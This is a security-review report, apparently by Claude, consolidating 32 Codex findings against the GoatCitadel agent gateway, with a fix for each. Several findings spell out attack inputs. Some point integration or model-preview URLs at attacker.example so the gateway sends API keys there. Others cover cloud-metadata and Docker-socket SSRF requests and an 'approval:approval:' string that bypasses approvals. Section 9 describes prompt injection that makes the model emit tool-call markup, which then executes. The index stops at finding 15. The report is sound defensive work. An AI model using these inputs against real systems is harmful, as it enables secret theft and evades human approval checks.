# Codex Security Findings — Review Report

**Source**: `codex-security-findings-2026-05-18T03-22-20.686Z.csv`
**Repository**: `goatcitadel/GoatCitadel`
**Generated**: 2026-05-17
**Reviewer**: Claude (consolidating Codex output)
**Integration branch for fixes**: `claude-code-takeover`

---

## Executive Summary

Codex flagged **32 findings** across the gateway, policy engine, integrations, CI/CD, and Mission Control UI. This document is a historical intake report for `codex-security-findings-2026-05-18T03-22-20.686Z.csv`; it is not the current branch's authoritative fix ledger. Current status must be established from the live implementation, regression tests, and verification lanes named in `docs/1_0_CONTRACT.md`. Commit dates span **2026-03-01 → 2026-05-15**, so the original issue set accumulated over roughly ten weeks of feature work.

| Original CSV severity | Count |
|---|---|
| Critical | 1 |
| High | 31 |
| **Total** | **32** |

The findings cluster into **11 themes**. The dominant patterns are not isolated bugs — they are repeated failures of the same control boundary:

1. **The network allowlist is not enforced consistently.** Five distinct routes/backends (Firecrawl scrape, Firecrawl ingest, integration diagnostics, integration actions, skill lookup) reach the outbound network without going through `fetchAllowlisted` or the private-IP guard. Most also leak environment secrets in the `Authorization` header to the attacker-controlled host.
2. **Approval gating is leaky.** Four independent paths (MCP dry-run, default tool policy, symlink escape, client-controlled `approval:` prefix, bulk approve) all let supposedly approval-required tools execute without approval.
3. **Integration "set home" commands are operator-only configuration mutations exposed to non-operators.** Both Discord and Telegram runtimes accept `/sethome` from paired (non-operator) chat users and persist it into operator config.
4. **Default credentials / unauthenticated services on first run.** Docker compose ships a known token, and the bundled Postgres path can launch a `--publish` container with `POSTGRES_HOST_AUTH_METHOD=trust` even when the operator did not select Postgres.

### Recommended triage order

| Phase | Findings | Why first |
|---|---|---|
| **P0 — ship today** | #1 Docker defaults · #2 Bundled Postgres unauth · #3 Native→Docker trust-auth fallback | Anyone running `docker compose up --build` on a LAN-reachable host gets owned with the default token, and a remote-reachable trust-auth Postgres can be launched on the same flow. Fix the default token, bind to `127.0.0.1`, and never start a `trust`-auth Postgres on `0.0.0.0`. |
| **P0 — ship today** | #19 Loopback recovery → remote operator · #21 Bulk approve | These two are remote operator takeover primitives reachable through normal authenticated routes (and the loopback one through a misconfigured reverse proxy). |
| **P1 — this week** | All SSRF / allowlist-bypass findings (#11–#14, #23) and secret-exfil-via-Authorization findings (#13, #15, #25–#26) | Same root cause: outbound `fetch()` without going through `fetchAllowlisted` + `assertHostAllowed` + a redirect-target check. Fix the helper and adopt it everywhere. |
| **P1 — this week** | Approval/policy bypasses (#4, #5, #16, #17) | Each one undermines the approval boundary the system markets. |
| **P2 — next** | Agent-abuse channels (#22, #29, #30), XSS (#9), CI signing secrets (#7, #10), weekly-audit egress (#27) | Real risk, but require either a malicious prompt, a malicious dependency, or a malicious attachment to trigger. |

---

## 1. The one Critical finding

### #1 — Docker defaults expose operator and database access

- **Severity**: Critical · **Status**: historical intake item; verify current status from live tests and release proof · **Patch**: not tracked by this intake document
- **Finding**: <https://chatgpt.com/codex/cloud/security/findings/9709d19686c4819198c4d58a8dd078ea>
- **Commit**: `e12424f8` (2026-04-10)
- **Paths**: `docker-compose.yaml` · `apps/gateway/src/plugins/auth.ts` · `apps/gateway/src/routes/auth.ts` · `apps/gateway/src/startup-guard.ts` · `apps/gateway/src/config.ts` · `config/goatcitadel.example.json` · `apps/gateway/src/bundled-postgres-runtime.ts` · `Dockerfile` · `.dockerignore`

**Three compounding problems in one commit:**

1. `docker-compose.yaml` sets `GATEWAY_HOST=0.0.0.0` and publishes `8787:8787` with no host-IP binding, so a fresh `docker compose up --build` exposes the gateway on every host interface.
2. `GOATCITADEL_AUTH_TOKEN` defaults to the public string `change-this-goatcitadel-token`. The auth plugin treats *any* request bearing that token as an **operator token**, and `startup-guard` only checks the token is non-empty — the placeholder passes the guard. Anyone on the LAN who reads the repo gets operator API access.
3. `.dockerignore` does not exclude `.env` / `.env.*`, and the Dockerfile copies the whole build context, so local provider keys can be baked into a built image and leak if the image is shared.

**Fix sketch**
- Bind to `127.0.0.1:8787` in compose; require an explicit `GATEWAY_BIND_ADDR` override for remote exposure.
- Reject the placeholder token in `startup-guard` (and any token in a published blocklist).
- Add `.env`, `.env.*`, `data/`, `node_modules/`, `.git/` to `.dockerignore`.
- Generate a per-install random token on first compose run; refuse to start without one.

---

## 2. Default-credentials & exposed network services (High × 2)

### #2 — Bundled Postgres starts as unauthenticated network service
- **Finding**: <https://chatgpt.com/codex/cloud/security/findings/b002db8e0b54819194b2e824b9b0ac2a> · **Commit**: `f37bca0a`
- **Paths**: `apps/gateway/src/plugins/storage.ts` · `apps/gateway/src/postgres-runtime-config.ts` · `apps/gateway/src/config.ts` · `apps/gateway/src/bundled-postgres-runtime.ts`

`ensureBundledPostgresRuntime` only checks `postgres.mode == "bundled"` and `bundledPostgres.enabled`, **not** `assistant.database.driver == "postgres"`. Defaults keep `driver=sqlite` but enable bundled Postgres with `autoStart=true`, so a normal gateway boot launches a `postgres:16-alpine` container with `--publish ${port}:5432` (binds all interfaces) and `POSTGRES_HOST_AUTH_METHOD=trust`. Anyone on the network can connect as the `postgres` superuser to a service the operator never asked to run.

**Fix**: Gate the bundled-Postgres launch on `driver == "postgres"`, bind Docker publishes to `127.0.0.1`, require a generated password instead of `trust`.

### #3 — Native Postgres failure silently falls back to trust-auth Docker
- **Finding**: <https://chatgpt.com/codex/cloud/security/findings/53f520f87f8c819183ef77ab52fd9450> · **Commit**: `abfb2c0b`
- **Paths**: `apps/gateway/src/bundled-postgres-runtime.ts`

A configured native bundled-Postgres that fails to start now falls back to the Docker backend instead of aborting. Native binds 127.0.0.1; Docker uses `--publish` and `trust`. An operator who explicitly chose native (because they wanted localhost-only) gets a remote-reachable, unauthenticated superuser service if native happens to fail.

**Fix**: Do not silently downgrade across security postures. If native fails, fail closed.

---

## 3. Authorization escalation (High × 4)

### #4 — Discord `/sethome` lets non-operator chat users redirect operator config
- **Finding**: <https://chatgpt.com/codex/cloud/security/findings/2affec9f0a288191a686bc5fbf03993c> · **Commit**: `9083560f`
- **Paths**: `apps/gateway/src/services/discord-runtime-bridge-service.ts` · `apps/gateway/src/services/discord-runtime-service.ts` · `apps/gateway/src/services/gateway-service.ts`

`handleDiscordRuntimeSlashCommand` intercepts `/sethome` from any user reachable through an approved pairing, channel allowlist, or unpaired DM when `inboundDmPolicy=open`, and writes `integrationConnections.config.defaultChannelId/defaultDiscordChannelId` directly. A non-operator chat user can permanently redirect background/scheduled deliveries (including the new watchdog notification path) to a channel they control.

### #5 — Telegram `/sethome` lets paired users reroute deliveries
- **Finding**: <https://chatgpt.com/codex/cloud/security/findings/31ebf5e2c21c8191b10db558e491acd8> · **Commit**: `4ebe75b5`
- **Paths**: `apps/gateway/src/plugins/auth.ts` · `apps/gateway/src/services/telegram-channel-pairing.ts` · `apps/gateway/src/services/telegram-channel-commands.ts` · `apps/gateway/src/routes/integration-webhooks.ts`

Same shape as #4. The Telegram webhook route applies a `configPatch` setting `defaultChannelId`/`defaultChatId` when any paired user (or any user when `allowAllTelegramUsers` is on) sends `/sethome`. Normal gateway operator auth is skipped — only the Telegram webhook secret + pairing membership is required.

**Fix for both**: `/sethome` and any command that mutates operator config must require the actor's identity to map to an operator principal, not just to a pairing/allowlist membership. Keep slash commands like `/sethome` behind an explicit operator-confirmed pairing flow.

### #19 — Implicit loopback recovery can grant remote operator access
- **Finding**: <https://chatgpt.com/codex/cloud/security/findings/b06f6f115e248191b1cff6c977d632cc> · **Commit**: `477b5ccb`
- **Paths**: `apps/gateway/src/plugins/auth.ts` · `apps/gateway/src/routes/auth.ts` · `apps/gateway/src/services/gateway/auth-credential-planner.ts` · `apps/gateway/src/routes/onboarding.ts` · `apps/gateway/src/services/gateway-service.ts`

A new "recovery" path lets `POST /api/v1/auth/install-token` and `POST /api/v1/onboarding/bootstrap` skip token/basic auth whenever the socket peer is loopback, onboarding is incomplete, and credentials are missing. It does **not** honor `auth.allowLoopbackBypass`. A common deployment puts the gateway on `127.0.0.1` behind a reverse proxy — if that proxy strips `X-Forwarded-For`, every request looks like loopback. A remote attacker can then POST `install-token` (with `generateWhenMissing` or an explicit token) and become operator.

**Fix**: Recovery routes must respect `allowLoopbackBypass` and must validate `X-Forwarded-For` / `req.ips` rather than `remoteAddress`. Better: do not gate "create operator credentials" on socket address at all; require physical-console proof (a one-time code printed to the gateway console).

### #21 — Bulk approval endpoint can approve & execute every pending action
- **Finding**: <https://chatgpt.com/codex/cloud/security/findings/222ac26b86fc8191b4892ba26655929b> · **Commit**: `dff9609a`
- **Paths**: `apps/gateway/src/routes/approvals.ts` · `apps/gateway/src/services/gateway-service.ts` · `apps/gateway/src/plugins/auth.ts`

`/api/v1/approvals/bulk-resolve` accepts `decision: "approve"` for up to 10,000 pending approvals at once and calls `resolveApproval` (which executes the action via `policyEngine.executeApprovedAction`). The route adds no stronger authorization than other routes — device bearer tokens are still accepted. An XSS, a compromised UI token, or a non-operator device principal can mass-approve and execute every pending dangerous action.

**Fix**: Allow only `decision: "reject"` at the bulk endpoint. Add a separate, operator-only route for bulk-approve that requires a freshly verified operator credential.

---

## 4. SSRF / network allowlist bypass (High × 4)

All four reuse the same anti-pattern: a new feature calls `fetch()` directly instead of going through `fetchAllowlisted` + `assertHostAllowed`.

### #11 — Firecrawl scrape bypasses allowlist on redirect
- **Finding**: <https://chatgpt.com/codex/cloud/security/findings/316c187311b081919e3d23a72820a8ed> · **Commit**: `5dcbe5f1`
- **Paths**: `packages/policy-engine/src/engine.ts` · `packages/policy-engine/src/browser-tools.ts` · `packages/policy-engine/src/ingestion-backends.ts`

`browser.navigate`/`browser.extract`/URL-based `docs.ingest` with `backend=firecrawl` validate the requested URL but trust Firecrawl's response — `metadata.sourceURL` / `data.url` is not re-checked. An allowlisted public URL that 30x-redirects to `169.254.169.254` (cloud metadata) returns the internal body to the model or knowledge store.

### #12 — Firecrawl ingest bypasses allowlist via `sourceType` enum
- **Finding**: <https://chatgpt.com/codex/cloud/security/findings/af0d7680af508191ae639efcbbc94d2c> · **Commit**: `0c628f6f`
- **Paths**: `apps/gateway/src/routes/tools-invoke.ts` · `packages/policy-engine/src/engine.ts` · `packages/policy-engine/src/ingestion-backends.ts`

Policy engine only validates URL when `sourceType == "url"` (lowercase exact match), but `ingestDocumentViaBackend` casts `sourceType` to the enum without checking it, treating anything that is not `"file"`/`"text"` as a URL ingestion. Send `sourceType="URL"` (uppercase) + `backend="firecrawl"` + `firecrawlBaseUrl="http://169.254.169.254"` and the gateway does a raw `fetch()` to the attacker host, with `FIRECRAWL_API_KEY` in the `Authorization` header.

### #14 — Skill lookup is an authenticated SSRF
- **Finding**: <https://chatgpt.com/codex/cloud/security/findings/ce90cfa85a94819189b0a4c4b1bd8b16> · **Commit**: `297aaa8c`
- **Paths**: `apps/gateway/src/routes/skills.ts` · `apps/gateway/src/services/skill-import-service.ts`

`isMarketplaceListingUrl()` does substring matching against the input, not host equality. `q=http://127.0.0.1:2375/version?x=https://skillsmp.com/` passes the marketplace test and causes the gateway to fetch the Docker socket. Blind SSRF, internal probe, state-changing GETs.

### #23 — Live diagnostics: SSRF + env-secret exfiltration
- **Finding**: <https://chatgpt.com/codex/cloud/security/findings/eeb454f4b41881919e10736312e2666b> · **Commit**: `c37ecd47`
- **Paths**: `apps/gateway/src/routes/integrations.ts` · `apps/gateway/src/services/gateway-service.ts`

Matrix/Mattermost diagnostics build the URL from connection `homeserverUrl`/`serverUrl`/`baseUrl` and put `process.env[accessTokenEnv]` in `Authorization: Bearer …`. Connection config is an arbitrary record. Any caller who can create/update a connection sets `homeserverUrl=https://attacker.example` and `accessTokenEnv=OPENAI_API_KEY` and hits `/diagnostics`. Triple risk: SSRF, blind probe, secret exfil.

**Cross-cutting fix for all four**: Audit every `fetch()` in `apps/gateway` and `packages/policy-engine`. Replace with `fetchAllowlisted`. Then add a guard inside `fetchAllowlisted` that re-validates the *final* URL after every redirect (manual redirect mode, then re-call `assertHostAllowed` on `Location`), and refuses `http://169.254.0.0/16`, RFC1918, loopback, `metadata.google.internal`, etc. unless the loopback exception is explicit.

---

## 5. Credential / secret exfiltration via gateway-as-proxy (High × 5)

### #13 — Integration actions exfiltrate environment secrets
- **Finding**: <https://chatgpt.com/codex/cloud/security/findings/2d4c5de7ef488191b7349b01b6c3e062> · **Commit**: `f8379b17`
- **Paths**: `apps/gateway/src/routes/integrations.ts` · `apps/gateway/src/services/integration-channel-service.ts` · `apps/gateway/src/services/integration-action-service.ts` · `apps/gateway/src/services/gateway-service.ts`

`createIntegrationConnection` persists an arbitrary `config` object. `invokeLocalBridgeAction` then reads `bridgeUrl`/`authTokenEnv` from it and POSTs `Authorization: Bearer <process.env[authTokenEnv]>` to the configured URL with a plain `fetch()`. A device/companion token can create a `productivity.apple-notes` connection with `bridgeUrl=https://attacker.example` and `authTokenEnv=OPENAI_API_KEY`.

### #15 — LLM config endpoint leaks provider transport secrets
- **Finding**: <https://chatgpt.com/codex/cloud/security/findings/4d604c6bf1148191af64c2c715ef6e58> · **Commit**: `12ae20d3`
- **Paths**: `apps/gateway/src/routes/llm.ts` · `apps/gateway/src/services/gateway-service.ts` · `apps/gateway/src/services/llm-service.ts` · `apps/gateway/src/plugins/auth.ts`

`GET /api/v1/llm/config` now returns `getLlmConfigWithDetails()`, which includes `providerConfigs`. `exportConfigFile()` strips `provider.apiKey` but **preserves `provider.request` wholesale** — including `request.headers` and inline `request.auth`/`request.proxy.auth` values. Device/companion tokens can read it.

### #25 — LLM model preview leaks existing provider credentials (variant A — baseUrl swap)
- **Finding**: <https://chatgpt.com/codex/cloud/security/findings/500bb176f9d88191a728a36ff70d8abb> · **Commit**: `77f33aa2`
- **Paths**: `apps/gateway/src/routes/llm.ts` · `apps/gateway/src/services/llm-service.ts`

`previewModels` falls back to the existing provider's secrets/headers when the request omits `apiKey`, then sends `Authorization: Bearer <resolved key>` to the caller-supplied `baseUrl`. A caller who knows a `providerId` but cannot read its key can POST `{providerId, baseUrl: "https://attacker.example"}` and the gateway leaks the stored credential.

### #30 — LLM model preview can exfiltrate stored provider secrets (variant B — keychain lookup)
- **Finding**: <https://chatgpt.com/codex/cloud/security/findings/41ce1d45efd88191bf50e75987dc0f82> · **Commit**: `135db054`
- **Paths**: `apps/gateway/src/routes/llm.ts` · `apps/gateway/src/services/llm-service.ts` · `apps/mission-control/src/pages/SettingsPage.tsx`

Same endpoint, different mechanism: `resolveApiKey` *always* checks the keychain by `provider.providerId` first, even when the rest of the temporary provider is caller-supplied. Worse: the Settings UI auto-invokes preview on every base-URL field change, so an operator typing a URL into a malicious co-browsing context could leak the key.

### #22 — Matrix/Mattermost attachments bypass per-grant `allowedHosts`
- **Finding**: <https://chatgpt.com/codex/cloud/security/findings/d310be9e7ef481918cae7be572ef395b> · **Commit**: `c541f9d1`
- **Paths**: `packages/policy-engine/src/tool-executor.ts` · `packages/policy-engine/src/engine.ts`

The `allowedHosts` constraint reads `args.url`/`args.host`/`args.target` but ignores `args.attachments[].url`. An agent with `channel.send` grants can use an attachment URL as a network-read primitive; the gateway buffers the body and uploads it as a file. Also: no size cap on the buffered response.

**Cross-cutting fix**: For #13, #25, #30 — never resolve secrets when the request supplies an arbitrary URL or arbitrary headers. Either (a) refuse the request, (b) require a fresh operator confirmation, or (c) only allow secrets to be resolved when the URL host matches the provider's configured host. For #22 — extend `extractGrantConstraintTargets()` to recursively visit `attachments[].url` and any other URL-bearing field.

---

## 6. Secret leakage via error messages (High × 2)

### #25b — BlueBubbles/iMessage + Zalo OA secrets in error strings
*(Listed as #25 in the CSV; renumbered here to avoid clash with the LLM preview finding.)*

- **Finding**: <https://chatgpt.com/codex/cloud/security/findings/5ef0be6f77248191aa087510cc7d3b7d> · **Commit**: `6838e5eb`
- **Paths**: `packages/policy-engine/src/tool-executor.ts` · `packages/policy-engine/src/sandbox/network-guard.ts`

BlueBubbles puts the bridge password in `?password=…`; Zalo OA puts the access token in the URL path. When `assertHostAllowed` blocks the request, it throws an error containing the full URL. The error is caught by `commsInvoke` and stored as the failed delivery reason — secret returned to the caller / model / tool transcript.

### #26 — Telegram bot token leaked in error string
- **Finding**: <https://chatgpt.com/codex/cloud/security/findings/9495baab64d4819184e367f2e81e132a> · **Commit**: `1bff4902`
- **Paths**: `packages/policy-engine/src/tool-executor.ts` · `packages/policy-engine/src/sandbox/network-guard.ts`

Same pattern. The Telegram URL is `https://api.telegram.org/bot${token}/sendMessage`; an allowlist miss surfaces the token in the failed-delivery reason.

**Cross-cutting fix**: `assertHostAllowed` should redact userinfo, query, and path before including the URL in the thrown error — `${url.protocol}//${url.host}` only. Better: make `fetchAllowlisted` responsible for sanitizing both inputs (no secrets in URL) and errors. Add a lint rule that bans putting secrets in URL query/path.

---

## 7. Approval / policy-engine bypass (High × 4)

### #4-policy — Default tool policy grants every tool
- **Finding**: <https://chatgpt.com/codex/cloud/security/findings/4db98541c2d08191b3b8e2e3ee9b3144> · **Commit**: `e2038583`
- **Paths**: `config/tool-policy.example.json` · `packages/contracts/src/config-schemas.ts` · `packages/policy-engine/src/policy-resolver.ts` · `packages/policy-engine/src/engine.ts` · `apps/gateway/src/services/chat-agent-orchestrator.ts` · `packages/policy-engine/src/tool-registry.ts` · `apps/gateway/src/config-files.ts`

Example policy now omits `tools.profile` and sets `tools.allow=["*"]`. A missing profile is treated as wildcard. First-run installs get every safe tool in the model's schema — including `file.read_range`, `file.find`, `calendar.list` — executable without approval.

### #16 — MCP invocations bypass per-call approval via dry-run
- **Finding**: <https://chatgpt.com/codex/cloud/security/findings/90bcb315eba481919030b9399f3ffc81> · **Commit**: `59df0237`
- **Paths**: `apps/gateway/src/services/tool-invocation-coordinator-service.ts` · `packages/policy-engine/src/engine.ts`

`evaluateMcpPolicy` calls the policy engine with `dryRun: true`. In the engine, the dry-run short-circuit runs *before* the `requiresApproval` branch — so a `requiresApproval=true` decision returns `outcome="executed"` with `dryRun` metadata, and `buildMcpPolicyFailure` only blocks on `approval_required` / `blocked`. Two of these checks then a real `invokeMcpRuntimeTool`. Net effect: `mcp.invoke` (danger, requires-approval) runs with no approval.

### #6 — Raw grant path check enables symlink read escape
- **Finding**: <https://chatgpt.com/codex/cloud/security/findings/3e17cb54638c819181af0fad8b0d83f6> · **Commit**: `a5b0a7ea`
- **Paths**: `packages/policy-engine/src/engine.ts` · `packages/policy-engine/src/sandbox/path-jail.ts` · `packages/policy-engine/src/tool-executor.ts`

`grantAllowsReadPath()` does lexical normalization with `path.posix.normalize()` and prefix matching — no realpath resolution. If `allowedPaths` contains a directory with a symlink to a sensitive location, `/granted/root/link/secret` matches the prefix while the resolved path is outside the root. The executor then does `fs.readFile(path.resolve(p))`, which follows the symlink.

### #17 — Client-controlled `approval:` prefix bypasses read approvals
- **Finding**: <https://chatgpt.com/codex/cloud/security/findings/e7bf6229f1d0819184a148336cde2b78> · **Commit**: `8c934a37`
- **Paths**: `apps/gateway/src/routes/tools-invoke.ts` · `packages/policy-engine/src/engine.ts` · `packages/policy-engine/src/tool-executor.ts` · `config/tool-policy.json`

`/api/v1/tools/invoke` strips a *single* leading `approval:` from the client-supplied `consentContext.reason`. Pass `"approval:approval:anything"` and it becomes `"approval:anything"`, which the policy engine treats as already approved. Approvals must be derived from trusted internal state (a pending approval record + matched path/tool), not from a substring of a client-supplied string.

---

## 8. Sandbox escape (High × 1)

### #18 — Linux Code Mode sandbox allows host file reads
- **Current status:** Resolved in the current Linux adapter. Code Mode now builds a private firejail profile with explicit whitelisted mounts and regression coverage; keep the original finding below as historical review evidence unless fresh tests reproduce it.
- **Finding**: <https://chatgpt.com/codex/cloud/security/findings/12e0332b59dc8191934743c944fba014> · **Commit**: `e0484f68`
- **Paths**: `apps/gateway/src/services/code-mode-sandbox/types.ts` · `apps/gateway/src/services/code-mode-sandbox/linux-firejail-adapter.ts` · `apps/gateway/src/services/code-mode-child-source.ts` · `apps/gateway/src/services/capability-system-service.ts`

Historical observation: the reviewed firejail profile used `read-only /` + writable temp. That blocked writes but permitted reads of the whole host fs. The guest is Node `vm`, which the code itself documents as not a security boundary — escape landed the attacker in a Node runtime with full-host read access. Operator UI labels this `sandbox-gated` / `temp_only`, which was wrong at the time.

**Fix status**: Closed by the current firejail `private` + whitelist profile. Keep `pnpm verify:code-mode:sandbox` and the Linux adapter regression tests in the release lane.

---

## 9. Agent abuse / prompt-injection channels (High × 3)

### #20 — Prompt text triggers hidden local file prefetch
- **Finding**: <https://chatgpt.com/codex/cloud/security/findings/5501db5fe45081918a979634bd104a42> · **Commit**: `de5712db`
- **Paths**: `apps/gateway/src/services/chat-agent-orchestrator.ts`

The Prompt Lab prefetch path runs on **every** chat turn, not just Prompt Lab. It extracts paths from the user prompt and pre-executes `file.read_range`/`fs.read`, prepending results into the LLM context. `.env` is in the bare-filename allowlist. A pasted untrusted snippet that mentions ``.env`` causes a privileged read on the operator's behalf before the model has even asked.

### #29 — Assistant content markup triggers unscoped tool calls
- **Finding**: <https://chatgpt.com/codex/cloud/security/findings/93e3d743390c8191a4c0fecbaa4c1d08> · **Commit**: `cf04468a`
- **Paths**: `apps/gateway/src/services/chat-agent-orchestrator.ts`

When the provider response lacks `tool_calls`, `parseSerializedToolCalls` scans assistant text for `<function=...>...</function>` and executes everything matched, including tools that were *not* in the turn's selected schema. Prompt injection from a fetched page / MCP result / document can make the model emit such markup; the orchestrator runs it. The schema/tool-selection boundary becomes advisory.

### #24 — Browser state reused by auto-approved navigation
- **Finding**: <https://chatgpt.com/codex/cloud/security/findings/1922c703a4748191a446628285345be1> · **Commit**: `f6bf3659`
- **Paths**: `packages/policy-engine/src/browser-tools.ts` · `packages/policy-engine/src/tool-registry.ts` · `apps/gateway/src/services/gateway-service.ts`

`browser.navigate` and `browser.extract` are caution / no-approval. Once a session has authenticated cookies/localStorage for a site, an attacker who can influence tool args can call `browser.navigate(authenticatedUrl)` and receive the rendered page text — no need to touch `browser.cookies.get`. `resolveBrowserSessionId` also trusts `args.browserSessionId`, so callers can target other in-memory state buckets.

**Fix for the trio**:
- #20: Limit prefetch to the Prompt Lab path explicitly. Remove `.env` from the bare-filename allowlist.
- #29: Only execute serialized calls for tools that appear in the turn's selected schema; reject unknown tool names rather than passing them through.
- #24: Authenticated browser state must require approval to reuse, or scope strictly to the execution context + origin. Drop `args.browserSessionId` overrides.

---

## 10. Sensitive data egress (High × 1)

### #27 — Weekly audit job ships chat/tool data to external LLM by default
- **Finding**: <https://chatgpt.com/codex/cloud/security/findings/339e43d3a8c88191b36efcde5b1bba3b>
- **Commit**: `04bafc7e`
- **Paths**: `config/cron-jobs.json` · `apps/gateway/src/services/gateway-service.ts`

An auto-enabled weekly scheduler samples recent chat turn traces and tool runs (including `args_json` / `result_json`), reconstructs transcript excerpts, and calls `createChatCompletion` with the default provider. No redaction, no filter for secret-bearing tool outputs, no opt-out gate. Default-on egress of sensitive content to whatever LLM provider is configured.

**Fix**: Make this opt-in; redact tool args/results before transmission; require explicit operator consent to enable.

---

## 11. CI/CD signing-secret exposure (High × 2)

### #7 — Windows signing secrets at job level
- **Finding**: <https://chatgpt.com/codex/cloud/security/findings/1e9ef3a27a6481918795b8f2271fe305> · **Commit**: `af5dfe78`
- **Path**: `github/workflows/release-installers.yml`

Historical finding: `WINDOWS_SIGN_CERT_BASE64` and `WINDOWS_SIGN_CERT_PASSWORD` were previously defined at the **job** level, so every step could inherit them.

Current status: fixed in `.github/workflows/release-installers.yml`. The job-level environment now contains only boolean presence flags, and the certificate/password values are scoped to the desktop-executable and installer signing steps.

### #10 — Windows signing secret via CI PATH hijack
- **Finding**: <https://chatgpt.com/codex/cloud/security/findings/386b3e4f7f7c81918b9275da6cc60212> · **Commit**: `c1e7d2ca`
- **Path**: `github/workflows/release-installers.yml`

Historical finding: earlier steps could append to `GITHUB_PATH` or drop a watcher process, then a signing step that resolved `signtool.exe` through PATH could be hijacked.

Current status: fixed for the current workflow. Signing resolves `signtool.exe` from the Windows SDK install path instead of PATH search, writes the PFX to a GUID-named temp file, and removes it in `finally`.

Remaining hardening option: move signing to a separate workflow/job that receives only unsigned artifacts, or use a short-lived signing service / HSM-backed flow.

---

## 12. XSS (High × 1)

### #9 — Attachment Open executes active blob content
- **Finding**: <https://chatgpt.com/codex/cloud/security/findings/d885b5fed47c8191947b5e7c17459efb> · **Commit**: `eb234a5d`
- **Paths**: `packages/mission-control-shared/src/components/chat/ChatAttachmentActions.tsx` · `apps/gateway/src/services/chat-attachment-service.ts` · `apps/gateway/src/routes/chat.attachments.ts`

The new "Open" button downloads the attachment, makes a `blob:` URL with the uploader-supplied MIME type, and opens it in a new tab. `text/html` or `image/svg+xml` executes in a blob URL associated with the Mission Control origin → stored XSS that can read web-storage tokens, make authenticated gateway calls, exfil chat/settings.

**Fix**: Force-download arbitrary attachments. Only render a strict allowlist of passive types (`image/png`, `image/jpeg`, `application/pdf`) in a sandboxed iframe at an isolated origin; coerce everything else to `application/octet-stream`.

---

## Cross-cutting recommendations

These come up repeatedly across the 32 findings and would each eliminate multiple findings at once.

1. **One outbound HTTP helper, no exceptions.** Replace every direct `fetch()` in `apps/gateway` and `packages/policy-engine` with `fetchAllowlisted`. Add an ESLint rule (`no-restricted-imports`/`no-restricted-globals`) banning bare `fetch`. Make `fetchAllowlisted`:
   - validate the URL host against the allowlist *and* private-IP list,
   - do manual redirect handling, revalidating the destination at each hop,
   - never put secrets in the URL (require `Authorization` headers instead),
   - on error, include only `${protocol}//${host}` — never the path, query, or userinfo.
   - This kills findings #11, #12, #13, #14, #22, #23 (SSRF/exfil) and #25b/#26 (error leakage).

2. **Approval state must be trusted state, not a client field.** Approvals should be tied to a server-issued approval ID validated against pending records and bound to a specific tool + arguments. Remove the `approval:` reason-prefix shortcut entirely. This kills #17 and tightens #16, #21.

3. **Tool registry must be reactive to runtime feature flags.** Rebuild on flag toggle (or look up `toolDef` at evaluation time). This kills #31 and prevents the same class for any future feature flag.

4. **Integration `config` is untrusted input.** Validate every field with a schema before persisting. Treat `bridgeUrl`/`baseUrl`/`homeserverUrl` as URLs that must pass the same allowlist as outbound tool traffic. Treat `*Env` fields as a closed allowlist of env-var names (not "anything in `process.env`"). This kills #13, #23 and tightens #15.

5. **`/sethome`-style commands belong behind an operator step-up.** Any chat-side command that mutates `integrationConnections.config` must require the actor be the operator, established via an OOB pairing handshake (not by being in the connection's pairing list). This kills #4 and #5.

6. **Default deployment must fail closed.**
   - Reject the placeholder auth token (#1).
   - Bind to loopback unless `GATEWAY_BIND_ADDR` says otherwise (#1).
   - Refuse to launch a `trust`-auth Postgres on a `--publish` mapping at all (#1, #2, #3).
   - Gate bundled Postgres on `driver=postgres` (#2).
   - Disable the weekly-audit egress by default (#27).

7. **Stop conflating "loopback peer" with "operator."** The loopback recovery path (#19) and any future helper need to distinguish (a) a request whose original source was the local console from (b) a request that arrived at `127.0.0.1` because there's a reverse proxy in front. Console-only recovery should use a one-time code printed to stdout.

8. **Audit every place where attacker-controlled data flows into a fetch URL or model context.** #20 and #29 both turn untrusted strings (prompt text, assistant text) into privileged side effects. Add a code review checklist item: *"Does this path execute on untrusted input from a model, document, or chat partner?"* If yes, gate on schema-membership and explicit operator approval.

---

## Index — all 32 findings

| # | Severity | Title | Commit | Finding |
|---|---|---|---|---|
| 1 | Critical | Docker defaults expose operator and DB | e12424f8 | [9709d196…](https://chatgpt.com/codex/cloud/security/findings/9709d19686c4819198c4d58a8dd078ea) |
| 2 | High | Bundled Postgres unauth network service | f37bca0a | [b002db8e…](https://chatgpt.com/codex/cloud/security/findings/b002db8e0b54819194b2e824b9b0ac2a) |
| 3 | High | Native Postgres trust-auth Docker fallback | abfb2c0b | [53f520f8…](https://chatgpt.com/codex/cloud/security/findings/53f520f87f8c819183ef77ab52fd9450) |
| 4 | High | Discord `/sethome` redirect | 9083560f | [2affec9f…](https://chatgpt.com/codex/cloud/security/findings/2affec9f0a288191a686bc5fbf03993c) |
| 5 | High | Telegram `/sethome` redirect | 4ebe75b5 | [31ebf5e2…](https://chatgpt.com/codex/cloud/security/findings/31ebf5e2c21c8191b10db558e491acd8) |
| 6 | High | Symlink read escape via raw grant path | a5b0a7ea | [3e17cb54…](https://chatgpt.com/codex/cloud/security/findings/3e17cb54638c819181af0fad8b0d83f6) |
| 7 | High | Windows signing secrets job-level env | af5dfe78 | [1e9ef3a2…](https://chatgpt.com/codex/cloud/security/findings/1e9ef3a27a6481918795b8f2271fe305) |
| 8 | High | Default tool policy grants all tools | e2038583 | [4db98541…](https://chatgpt.com/codex/cloud/security/findings/4db98541c2d08191b3b8e2e3ee9b3144) |
| 9 | High | Attachment Open executes blob content (XSS) | eb234a5d | [d885b5fe…](https://chatgpt.com/codex/cloud/security/findings/d885b5fed47c8191947b5e7c17459efb) |
| 10 | High | Windows signing secret PATH hijack | c1e7d2ca | [386b3e4f…](https://chatgpt.com/codex/cloud/security/findings/386b3e4f7f7c81918b9275da6cc60212) |
| 11 | High | Firecrawl scrape redirect bypasses allowlist | 5dcbe5f1 | [316c1873…](https://chatgpt.com/codex/cloud/security/findings/316c187311b081919e3d23a72820a8ed) |
| 12 | High | Firecrawl ingest `sourceType` bypass | 0c628f6f | [af0d7680…](https://chatgpt.com/codex/cloud/security/findings/af0d7680af508191ae639efcbbc94d2c) |
| 13 | High | Integration actions exfil env secrets | f8379b17 | [2d4c5de7…](https://chatgpt.com/codex/cloud/security/findings/2d4c5de7ef488191b7349b01b6c3e062) |
| 14 | High | Skill lookup authenticated SSRF | 297aaa8c | [ce90cfa8…](https://chatgpt.com/codex/cloud/security/findings/ce90cfa85a94819189b0a4c4b1bd8b16) |
| 15 | High | LLM config endpoint leaks transport secrets | 12ae20d3 | [4d604c6b…](https://chatgpt.com/codex/cloud/security/findings/4d604c6bf1148191af64c2c715ef6e58) |
